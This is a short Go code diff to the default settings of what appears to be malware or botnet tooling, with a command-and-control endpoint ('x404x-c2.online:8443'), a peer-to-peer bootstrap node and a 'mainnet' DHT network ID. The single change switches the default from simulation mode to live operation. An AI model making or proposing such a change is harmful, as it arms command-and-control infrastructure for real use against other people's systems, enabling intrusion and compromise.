@@ -23,7 +23,7 @@ type V210Config struct {
 
 func DefaultV210Config() *V210Config {
 	return &V210Config{
-		Enabled: true, Simulation: true,
+		Enabled: true, Simulation: false,
 		C2Endpoint: "x404x-c2.online:8443",
 		P2PBootstrapNode: "/ip4/127.0.0.1/tcp/4001",
 		DHTNetworkID: "x404x-apocalipsis-mainnet",
